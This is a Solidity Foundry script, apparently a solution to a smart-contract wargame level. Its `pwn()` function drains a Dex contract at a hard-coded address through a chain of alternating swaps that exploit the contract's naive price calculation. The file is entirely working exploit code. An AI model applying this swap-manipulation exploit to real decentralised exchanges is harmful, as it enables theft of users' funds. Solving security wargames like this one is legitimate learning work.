//SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import {Script, console} from "../lib/forge-std/src/Script.sol";
import {Dex} from "../src/Dex.sol";

contract DexScript is Script {
    Dex public dex;

    function run() external {
        dex = Dex(0xe809a80141aFb3a99fDaa274ea7D05e3da0F25f4);
        pwn();
    }

    function pwn() public {
        address dexAddress = 0xe809a80141aFb3a99fDaa274ea7D05e3da0F25f4;
        address token1 = dex.token1();
        address token2 = dex.token2();

        vm.startBroadcast();
        dex.approve(dexAddress, 100000);

        dex.swap(token1, token2, 10);
        dex.swap(token2, token1, 20);
        dex.swap(token1, token2, 24);
        dex.swap(token2, token1, 30);
        dex.swap(token1, token2, 41);

        dex.swap(token2, token1, 45);

        vm.stopBroadcast();
    }
}
